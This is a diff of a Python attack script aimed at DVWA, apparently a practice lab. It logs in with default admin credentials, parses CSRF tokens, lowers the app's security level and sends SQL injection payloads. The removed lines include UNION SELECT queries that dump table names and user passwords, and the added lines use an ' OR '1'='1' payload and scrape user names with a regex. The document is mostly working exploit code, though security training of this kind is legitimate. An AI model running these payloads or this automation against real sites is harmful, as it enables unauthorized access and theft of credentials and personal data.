@@ -6,6 +6,7 @@ import os
 import sys
 import json
 import time
+import re
 
 # Setup directories and session
 logs_dir = Path('logs')
@@ -37,64 +38,61 @@ headers = {
 }
 
 def login_and_setup_security():
-    #response = session.get(login_url)
-    data = {
+    login_response = session.get(login_url)  # Pega a página de login para obter o token CSRF, se houver
+    soup = BeautifulSoup(login_response.text, 'html.parser')
+    user_token = soup.find('input', {'name': 'user_token'}).get('value') if soup.find('input', {'name': 'user_token'}) else None
+
+    login_data = {
         'username': 'admin',
         'password': 'password',
         'Login': 'Login',
+        'user_token': user_token  # Inclua o token CSRF se necessário
     }
-    response = session.post(login_url, data=data, headers=headers)
-    soup = BeautifulSoup(response.text, 'html.parser')
-    user_token = soup.find('input', {'name': 'user_token'}).get('value') if soup.find('input', {'name': 'user_token'}) else None
-    time.sleep(delay) 
+    login_response = session.post(login_url, data=login_data, headers=headers)
     
-    print("Login response status:", response.status_code)
-    #response = session.get(security_url)
-    data = {
+    # Verifique se o login foi bem sucedido analisando a resposta ou verificando os cookies
+    if 'PHPSESSID' in session.cookies:
+        print("Login successful, PHPSESSID:", session.cookies['PHPSESSID'])
+    else:
+        print("Login failed")
+        return
+
+    # Configure o nível de segurança para baixo
+    security_response = session.get(security_url)
+    soup = BeautifulSoup(security_response.text, 'html.parser')
+    security_token = soup.find('input', {'name': 'user_token'}).get('value')
+    security_data = {
         'security': 'low',
         'seclev_submit': 'Submit',
-        'user_token': user_token
+        'user_token': security_token
     }
-    session.post(security_url, data=data, headers=headers)
-    time.sleep(delay) 
-    
-    print("Security low mode response status:", response.status_code)
+    session.post(security_url, data=security_data, headers=headers)
 def sql_injection_attack():
     total_tests = 0
     tests_passed = 0
     tests_failed = 0
     details = []
+    payload = "' OR '1'='1'#"
 
-    # Example of SQLi payloads that might extract passwords if vulnerable
-    payloads = {
-        '1': "' OR '1'='1'# ",
-        '2': "'UNION SELECT table_name, NULL FROM information_schema.tables --",
-        '3': "'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users' --",
-        '4': "'UNION SELECT user, password FROM users --"
-    }
+    data = {'id': payload, 'Submit': 'Submit'}
+    response = session.post(sqli_url, data=data, headers=headers)
+    total_tests += 1
 
-    for user_id, payload in payloads.items():
-        total_tests += 1
-        response = session.get(sqli_url, params={'id': payload})
-        
-        if response.status_code == 200 and "Password:" in response.text:
-            tests_passed += 1
-            result_status = "PASSED - Retrieved password successfully"
-            password = BeautifulSoup(response.text, 'html.parser').text.split("Password:")[1].strip()
-        else:
-            tests_failed += 1
-            result_status = "FAILED - SQL Injection did not retrieve data"
-            password = "No password retrieved"
-        time.sleep(delay)
-        
-        details.append({
-            "user_id": user_id,
-            "payload": payload,
-            "response_code": response.status_code,
-            "status": result_status,
-            "extracted_password": password
-        })
-        print(f"Tested SQLi with payload '{payload}' for user ID {user_id}\nResult Status: {result_status}\nExtracted Password: {password}\n")
+    matches = re.findall(r"First name: (.+?)<br />Surname: (.+?)<", response.text)
+    if response.status_code == 200 and matches:
+        tests_passed += 1
+        result = "PASSED"
+    else:
+        tests_failed += 1
+        result = "FAILED"
+
+    details.append({
+        "payload": payload,
+        "status_code": response.status_code,
+        "result": result,
+        "extracted_data": matches
+    })
+    time.sleep(delay)
 
     # Log the results
     script_name = os.path.splitext(os.path.basename(__file__))[0]
@@ -110,6 +108,7 @@ def sql_injection_attack():
         'tested_url': sqli_url,
         'details': details
     }
+
     with open(results_file, 'w') as f:
         json.dump(result_summary, f, indent=4)
     print(f"Results saved to {results_file}")
